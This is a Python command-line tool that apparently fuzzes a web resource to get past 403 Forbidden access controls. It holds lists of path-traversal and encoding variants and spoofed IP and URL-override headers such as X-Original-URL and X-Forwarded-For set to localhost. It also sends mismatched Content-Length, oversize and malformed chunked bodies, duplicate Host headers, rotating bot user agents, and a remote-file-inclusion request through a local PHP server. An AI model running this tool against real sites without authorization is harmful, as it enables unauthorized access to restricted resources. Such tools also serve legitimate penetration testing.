import sys
import os
from urllib.parse import urlparse
import argparse
import time
import subprocess
import http.client
import socket
import ssl
import warnings
import time
import random

#supress invalid escape sequence warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)

#colors
GREEN = '\033[92m'  #green
RED = '\033[91m'    #red
RED2 = '\033[31m'   #red (dull)
YELLOW = '\033[33m' #yellow
CYAN = '\033[36m'   #cyan
MAGENTA = '\033[95m'#magenta
RESET = '\033[0m'   #reset to default color

pathVariants = [

    "url.com/admin/?",
    "url.com//admin//",
    "url.com///admin///",
    "url.com/./admin/./",
    "url.com/admin?",
    "url.com/admin??",
    "url.com/admin??",
    "url.com/admin/?/",
    "url.com/admin/??",
    "url.com/admin/??/",
    "url.com/admin/..",
    "url.com/admin/../",
    "url.com/admin/./",
    "url.com/admin/.",
    "url.com/admin/.//",
    "url.com/admin/*",
    "url.com/admin//*",
    "url.com/admin/%2f",
    "url.com/admin/%2f/",
    "url.com/admin/%20",
    "url.com/admin/%20/",
    "url.com/admin/%09",
    "url.com/admin/%09/",
    "url.com/admin/%0a",
    "url.com/admin/%0a/",
    "url.com/admin/%0d",
    "url.com/admin/%0d/",
    "url.com/admin/%25",
    "url.com/admin/%25/",
    "url.com/admin/%23",
    "url.com/admin/%23/",
    "url.com/admin/%26",
    "url.com/admin/%3f",
    "url.com/admin/%3f/",
    "url.com/admin/%26/",
    "url.com/admin/#",
    "url.com/admin/#/",
    "url.com/admin/#/./",
    "url.com/./admin",
    "url.com/./admin/",
    "url.com/..;/admin",
    "url.com/..;/admin/",
    "url.com/.;/admin",
    "url.com/.;/admin/",
    "url.com/;/admin",
    "url.com/;/admin/",
    "url.com//;//admin",
    "url.com//;//admin/",
    "url.com/admin/./",
    "url.com/%2e/admin",
    "url.com/%2e/admin/",
    "url.com/%20/admin/%20",
    "url.com/%20/admin/%20/",
    "url.com/admin/..;/",
    "url.com/admin.json",
    "url.com/admin/.json",
    "url.com/admin..;/",
    "url.com/admin;/",
    "url.com/admin%00",
    "url.com/admin.css",
    "url.com/admin.html",
    "url.com/admin?id=1",
    "url.com/admin~",
    "url.com/admin/~",
    "url.com/admin/*/",
    "url.com/admin/&",
    "url.com/admin/-",
    "url.com/admin\/\/",
    "url.com/admin/..%3B/",
    "url.com/admin/;%2f..%2f..%2f",
    "url.com/ADMIN",
    "url.com/ADMIN/",
    "url.com/admin/..\;/",
    "url.com/*/admin",
    "url.com/*/admin/",
    "url.com/ADM+IN",
    "url.com/ADM+IN/"
]

headerInjections = [
    "Client-IP",
    "Client-Address",
    "Clientaddress",
    "Client",
    "Forwarded-For-Ip",
    "Forwarded-For",
    "Forwarded",
    "Http-Referer",
    "True-Client-IP",
    "Test-Server-Path",
    "Real-IP",
    "On-Behalf-Of",
    "Referer",
    "Origin",
    "X-Client-IP",
    "X-Custom-IP-Authorization",
    "X-Forward-For",
    "X-Forward",
    "X-Forwarded-By",
    "X-Forwarded-For-Original",
    "X-Originally-Forwarded-For",
    "X-Forwarded-For",
    "X-Forwarder-For",
    "X-Forward-For",
    "X-Forwarded-Server",
    "X-Forwarded",
    "X-Forwared-Host",
    "X-Host",
    "X-HTTP-Host-Override",
    "X-Originating-IP",
    "X-Real-IP",
    "X-Remote-Addr",
    "X-Remote-IP",

    #wrong origin
    "X-Original-URL",
    "X-Override-URL",
    "X-Rewrite-URL",

]

userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.3179.73",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.3179.73",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/119.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Vivaldi/7.3.3635.9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Vivaldi/7.3.3635.9",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36 OPR/79.0.0.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:137.0) Gecko/137.0 Firefox/137.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Sogou web spider/4.0; +http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
    "Mozilla/5.0 (compatible; facebot/1.0; +http://www.facebook.com/externalhit_uatext.php)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Brave/135.0.0.0",
    "Mozilla/5.0 (Linux; U; Android 14; en-US; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36 Puffin/9.7.0.50507AP",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/6.1.2.1000 Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 SeaMonkey/2.53.10",
    "Lynx/2.8.9rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.0.2g",
    "Wget/1.21.1 (linux-gnu)",
    "curl/7.79.1",
    "PostmanRuntime/7.35.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/UQ1A.240205.004)",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 YaBrowser/24.4.0.0 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi Note 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
]


#color code response codes
def color_code_status_code(status_code):
    if 200 <= status_code < 300:
        return f"{GREEN}{status_code}{RESET}"  #green for 200s
    elif 400 <= status_code < 500:
        return f"{RED}{status_code}{RESET}"  #red for 400s
    elif 500 <= status_code < 600:
        return f"{YELLOW}{status_code}{RESET}"  #yellow for 500s
    else:
        return f"{status_code}"  #no color for other codes


def color_code_return_length(returnLength):
    return f"{RED2}        Return length is {returnLength}{RESET}"

#used to make requests
def makeRequest (tls, netloc, path, method, headers, data=None, proxies=None, custom403=None):

    proxy = proxies.get("http") if proxies else None

    if proxy:
        parsed = urlparse(proxy)
        proxyHost = parsed.hostname
        proxyPort = parsed.port or 8080

        #connect to the proxy
        sock = socket.create_connection((proxyHost, proxyPort))

        if tls:

            #send connection request to proxy
            connectRequest = f"CONNECT {netloc}:443 HTTP/1.1\r\nHost: {netloc}\r\n\r\n"
            sock.sendall(connectRequest.encode())

            #check the proxy has connected
            proxyResponse = sock.recv(4096)
            if b"200 Connection established" not in proxyResponse:
                print("[!] Failed to connect to proxy")
                sys.exit()

            #wrap socket with TLS
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=netloc)
            conn = http.client.HTTPSConnection(netloc)
            conn.sock = sock

        else:
            conn = http.client.HTTPConnection(proxyHost, proxyPort)
            conn.set_tunnel(netloc)
    
    else:
        conn = http.client.HTTPSConnection(netloc) if tls else http.client.HTTPConnection(netloc)
    
    conn.request(method, path, body=data, headers=headers)

    try:
        response = conn.getresponse()
        status = response.status
        text = response.read().decode("utf-8")

        #deal with a redirect to a custom 403 page
        if (status in (301, 302)) and (custom403 in text):
            location = urlparse(response.getheader("Location"))
            locationHost = location.hostname
            locationPath = location.path

            #make request again to redirected page
            redirected_status, redirected_length = makeRequest(tls, locationHost, locationPath, method, headers, data, proxies)
            
            if custom403 and custom403 in text:
                return status, response.getheader("Content-Length")

    except:
        conn.close()
        return 400, defaultContentLength

    conn.close()
    #return response.status, response.getheader("Content-Length")
    return status, response.getheader("Content-Length")

#checks if the returned content length is more than 50 characters longer or shorter than the defualt
#if so it flags it as there might be something of interest
def checkContentLength(contentLength, defaultContentLength):
    if contentLength == None:
        return True
    elif abs(int(defaultContentLength) - int(contentLength)) > 50:
        return True


#########DEFAULT VALUES###############
#define some default values

#used for oversize data method
randomData = "SW5wdXQgc29tZSByYW5kb20gZGF0YSB0aGF0IGlzIG5vdCByZWxldmFudCB0byBhbnl0aGluZyBhbmQgZW5jb2RlIGl0IGluIGJhc2U2NCBzbyB0aGF0IHdlIGNhbiBzZW5kIGl0IGluIGEgcmVxdWVzdCB0byB0cnkgYW5kIGZ1enogYSA0MDMgZm9yYmlkZGVuIHJldHVybg=="
oversizeData = randomData * 1000
data = {}
proxy = {}


#########SETUP ARGPARSER###############
#define argument parser
parser = argparse.ArgumentParser(add_help=False)
parser.add_argument('--help', action='help', help='Show this help message and exit')

##add arguments
general = parser.add_argument_group("Fuzzing Options")
general.add_argument('-t', type=str, metavar='', help="url of target file")
general.add_argument('--all', action="store_true", default=False, help="perform all fuzzing techniques except for remote file inclusion (path fuzzing, header fuzzing, content length mismatch, oversize data, remote file inclusion and chunking)")
general.add_argument('--rfi', action="store_true", default=False, help="start a PHP server and attempt access via Remote File Inclusion. Requires PHP to be installed locally and configured to allow for RFI")
general.add_argument('-P', action="store_true", default=False, help="use path fuzzing")
general.add_argument('-H', action="store_true", default=False, help="use header fuzzing")
general.add_argument('-L', action="store_true", default=False, help="use content length mismatch")
general.add_argument('-O', action="store_true", default=False, help="use oversize data in request")
general.add_argument('-C', action="store_true", default=False, help="use incorrectly formatted chunked data")
general.add_argument('-U', action="store_true", default=False, help="use user agent fuzzing")

head = parser.add_argument_group("Header Options")
head.add_argument('-u', type=str, metavar='', help="define a custom user-agent")
head.add_argument('-r', action="store_true", default=False, help="use a random user agent")
head.add_argument('-h', type=str, metavar='', help="use file to define custom headers")
head.add_argument('-m', choices=["GET", "POST"], default="GET", help="select method to use - default is GET")

network = parser.add_argument_group("Network Options")
network.add_argument('-s', action="store_true", default=False, help="Force HTTPS. By default it tries to read HTTP/S from the url prefix. If not set, defaults to HTTP")
network.add_argument('-p', type=str, metavar='', help="send requests through proxy (this does not play well with POST requests). Format http://[IP]:[PORT] eg. http://127.0.0.1:8080")
network.add_argument('-to', type=int, metavar='', help="set the timeout between requests in milliseconds")

data = parser.add_argument_group("Data Options")
data.add_argument('-d', type=str, metavar='', help="data to include with request")
data.add_argument('-df', type=str, metavar='', help="get data to include with request from file")

experimental = parser.add_argument_group("Experimental Options")
experimental.add_argument('--custom', metavar='', type=str, help="if a standard 403 page is not returned and instead a redirect is made to a custom page, text to look for on custom page which denotes forbidden access")

#parse the args
args = parser.parse_args()

#print help
if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)


#########SET TIMEOUT###############
#convert from seconds to milliseconds
if args.to:
    timeout = args.to / 1000


#########USING PROXIES###############
if args.p:
    #proxy must start with http://
    if not args.p.startswith("http://"):
        args.p = "http://" + args.p
    proxy = {"http": args.p}


#########SPLIT OUT THE URL SEGMENTS########
#Used for purpose of string formatting - tries to read HTTP/S from the url prefix. If not set, defaults to HTTP
if (args.t).startswith("http://"):
    args.s = False
    url = urlparse(args.t)
elif (args.t).startswith("https://"):
    args.s = True
    url = urlparse(args.t)
else:
    url = urlparse("http://" + args.t)

netloc = url.netloc #this is the www.google.com part
path = url.path     #this is anything after the .com ie /folder/file.ext
completePath = netloc + path
dirName, fileName = os.path.split(path) #separate the path from the filename
urlSegment = netloc + dirName #create the folder path for the target folder


#use the same default headers as the requests library
headers = {
    'Host':  netloc,
    'User-Agent': 'python-requests/2.31.0',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept': '*/*',
    'Connection': 'keep-alive'
}

#get the default content length of a forbidden response so we can compare it to other returned content lengths using checkContentLength()
defaultResponseCode, defaultContentLength = makeRequest(args.s, netloc, path, args.m, headers)
print("\nThe default content length of the 403 response is: %s\n" % defaultContentLength)


##############SET UP CUSTOM HEADERS#################
#set a custom user agent
if args.u:
    headers.update({
        "User-Agent": args.u
    })
    print("Using User-Agent: " + args.u)

#set a random user agent
if args.r:
    randomAgent = random.choice(userAgents)
    headers.update({
        "User-Agent": randomAgent
    })

    print("Using User-Agent: " + randomAgent)

#custom headers from file
if args.h:
    headers = {}  #clear default headers
    with open (args.H, "r") as file:
        for line in file:
            line = line.strip()
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()


###########POST REQUEST DATA HANDLING###############
#include data supplied from command line
if (args.d):
    data = args.d

#include data from external file
if (args.df):
    with open(args.df, "r") as file:
        data = file.read()


#########CONTENT LENGTH MISMATCH############
data = None

if args.L or args.all:
    #print banner
    termWidth = os.get_terminal_size().columns
    print("\n")
    print(f"{YELLOW}#" * termWidth)
    print(f"#       Content Length Mismatch" + " " * (termWidth - 32) + "#")
    print(f"{"#" * termWidth}{RESET}")

    #if timeout set wait
    if args.to:
        time.sleep(timeout)

    #try larger than expected
    #if no user specified data use random data
    if data == None:
        data = randomData
        print(f"\n  The correct data size is: " + str(len(data.encode('utf-8'))))
        fakeSize = len(data.encode('utf-8')) + 100
        headers.update({
            "Content-Length": str(fakeSize)
        })
    #otherwise use user supplied data
    else:
        fakeSize = len(data.encode('utf-8')) + 100
        headers.update({
            "Content-Length": str(fakeSize)
        })

    #make the request
    statusCode, contentLength = makeRequest(args.s, netloc, path, args.m, headers, data, proxy, args.custom)
    print((f"  Trying Content-Length larger than data size").ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))
    if checkContentLength(contentLength, defaultContentLength):
        print(color_code_return_length(contentLength))

    #if timeout set wait
    if args.to:
        time.sleep(timeout)

    #try smaller than expected
    #if no user specified data use random data
    if data == None:
        data = randomData
        fakeSize = len(data.encode('utf-8')) - 50
        headers.update({
            "Content-Length": str(fakeSize)
        })
    #otherwise use user supplied data
    else:
        fakeSize = len(data.encode('utf-8')) - 50
        headers.update({
            "Content-Length": str(fakeSize)
        })

    #make the request
    statusCode, contentLength = makeRequest(args.s, netloc, path, args.m, headers, data, proxy, args.custom)
    print((f"  Trying Content-Length smaller than data size").ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))
    if checkContentLength(contentLength, defaultContentLength):
        print(color_code_return_length(contentLength))

    #if using GET method, suggest using POST for this instead
    if (args.m == "GET"):
        print(f"{MAGENTA}  Used the GET method. Perhaps try POST?{RESET}")

#########OVERSIZE DATA###############
if args.O or args.all:
    #print banner
    termWidth = os.get_terminal_size().columns
    print("\n")
    print(f"{YELLOW}#" * termWidth)
    print(f"#       Oversize Data" + " " * (termWidth - 22) + "#")
    print(f"{"#" * termWidth}{RESET}")

    #if timeout set wait
    if args.to:
        time.sleep(timeout)

    #make the request
    statusCode, contentLength = makeRequest(args.s, netloc, path, args.m, headers, oversizeData, proxy, args.custom)
    print((f"  Trying oversized data").ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))
    if checkContentLength(contentLength, defaultContentLength):
        print(color_code_return_length(contentLength))
    
    #if using GET method, suggest using POST for this instead
    if (args.m == "GET"):
        print(f"{MAGENTA}  Used the GET method. Perhaps try POST?{RESET}")


###########CHUNKING############
if args.C or args.all:
    #print banner
    termWidth = os.get_terminal_size().columns
    print("\n")
    print(f"{YELLOW}#" * termWidth)
    print(f"#       Incorrectly Chunked Data" + " " * (termWidth - 33) + "#")
    print(f"{"#" * termWidth}{RESET}")

    headers.update({
        "Transfer-Encoding": "chunked"
    })

    #create chunked data with wrong sizes 16
    data = "5\r\nChunk\r\n4\r\ndata\r\n8\r\nwrong\r\n12\r\nsize"

    #if timeout set wait
    if args.to:
        time.sleep(timeout)

    #make the request
    statusCode, contentLength = makeRequest(args.s, netloc, path, args.m, headers, data, proxy, args.custom)
    print("  Sending incorrectly chunked data".ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))
    if checkContentLength(contentLength, defaultContentLength):
        print(color_code_return_length(contentLength))
    if (args.m == "GET"):
        print(f"{MAGENTA}  Used the GET method. Perhaps try POST?{RESET}")



###########HEADER FUZZING APPROACH############
if args.H or args.all:
    #print banner
    termWidth = os.get_terminal_size().columns
    print("\n")
    print(f"{YELLOW}#" * termWidth)
    print(f"#       Header Fuzzing" + " " * (termWidth - 23) + "#")
    print(f"{"#" * termWidth}{RESET}")

    originalHeader = headers.copy()

    headerValues = ["localhost", "127.0.0.1", netloc, completePath]
    for injection in headerInjections:
        headers = originalHeader.copy()
        for value in headerValues:
            headers.update({
                injection: value
            })
            #run get/post request

            #if timeout set wait period between requests
            if args.to:
                time.sleep(timeout)

            statusCode, contentLength = makeRequest(args.s, netloc, path, args.m, headers, data, proxy, args.custom)
            print((f"{CYAN}  " + injection + f": {RESET}" + value).ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))
            if checkContentLength(contentLength, defaultContentLength):
                print(color_code_return_length(contentLength))


    #duplicate headers
    #NOTE - duplicate headers is not compatible with a proxy (a proxy can be set but will be ignored)
    print("\n")
    print(f"{YELLOW}Trying duplicate headers")
    print(f"------------------------{RESET}")

    #if timeout set wait
    if args.to:
        time.sleep(timeout)

    #this uses a custom connection request because duplicate headers don't play well with how the other requests are crafted
    #setup connection parameters
    if args.s:
        connection = http.client.HTTPSConnection(netloc)
    else:
        connection = http.client.HTTPConnection(netloc)
    
    connection.putrequest(args.m, path)
    connection.putheader("Host", netloc)
    connection.putheader("Host", "www.example.com")
    connection.endheaders()

    #make the request
    response = connection.getresponse()
    print("Status Code: " + color_code_status_code(response.status))
    if response.status != 400:
        print("Site able to process multiple host headers - check other combinations")
    connection.close()


############PATH FUZZING APPROACH##############
#separatedFileName = fileName[:1] + '+' + fileName[1:]
if args.P or args.all:
    #print banner
    termWidth = os.get_terminal_size().columns
    print("\n")
    print(f"{YELLOW}#" * termWidth)
    print(f"#       Path Fuzzing" + " " * (termWidth - 21) + "#")
    print(f"{"#" * termWidth}{RESET}")

    #replace the terms from the seclists list with the terms from args.t
    for variant in pathVariants:
        urlToTry = variant.replace("url.com", '').replace("admin", fileName).replace("ADM+IN", (fileName[:1] + '+' + fileName[1:]).upper()).replace("ADMIN", fileName.upper())

        #if timeout set wait
        if args.to:
            time.sleep(timeout)

        #make the request
        statusCode, contentLength = makeRequest(args.s, netloc, urlToTry, args.m, headers, data, proxy, args.custom)
        print((f"  " + netloc + urlToTry).ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))
        if checkContentLength(contentLength, defaultContentLength):
            print(color_code_return_length(contentLength))
    
    
###########RFI METHOD######################
if args.rfi:
    #print banner
    termWidth = os.get_terminal_size().columns
    print("\n")
    print(f"{YELLOW}#" * termWidth)
    print(f"#       Remote File Inclusion" + " " * (termWidth - 30) + "#")
    print(f"{"#" * termWidth}{RESET}")
    print("Note: successful requests return a 200 status code. Any other result will return a 403 status code\n")

    #start a php server
    cmd = ["php", "-S", "localhost:8000"]
    phpfolder = os.path.join(os.getcwd(),"php")
    print(f"{YELLOW}Starting PHP server on 0.0.0.0:8000...", end="", flush=True)
    #process = subprocess.Popen(cmd, cwd=os.getcwd(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process = subprocess.Popen(cmd, cwd=phpfolder, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #wait for the server to start up
    time.sleep(2)
    print(f"DONE{RESET}")
    
    #build the RFI URL
    rfiNetLoc = "localhost:8000"
    rfiPath = "/request.php?file=http://" + completePath


    #make the request
    statusCode, contentLength = makeRequest(args.s, rfiNetLoc, rfiPath, args.m, headers, data, proxy, args.custom)
    print("  Making RFI request with:")
    print("  " + rfiNetLoc + rfiPath)
    print(f"".ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))

    #close php server
    print(f"{YELLOW}Stopping PHP server...", end="", flush=True)
    process.terminate()
    process.wait()
    print(f"DONE{RESET}")

if args.U or args.all:
    #print banner
    termWidth = os.get_terminal_size().columns
    print("\n")
    print(f"{YELLOW}#" * termWidth)
    print(f"#       User Agent Fuzzing" + " " * (termWidth - 27) + "#")
    print(f"{"#" * termWidth}{RESET}")

    agentFuzzSuccess = False

    print("  Only user agents which return a non 403 response code will be shown")
    print("  This takes a long time, please be patient...\n")

    for userAgent in userAgents:
        #update the user agent in the hearder
        headers.update({
            "User-Agent": userAgent
        })

        #make the request
        statusCode, contentLength = makeRequest(args.s, netloc, path, args.m, headers, data, proxy, args.custom)

        #print only if status code != 403
        if statusCode != 403:
            print((f"  " + userAgent).ljust(termWidth - 16) + "Status Code: " + color_code_status_code(statusCode))
            agentFuzzSuccess = True

        if agentFuzzSuccess == False:
            print("  All user agents returned 403 status code")

#add final line before end of output to make it nice
print("\n")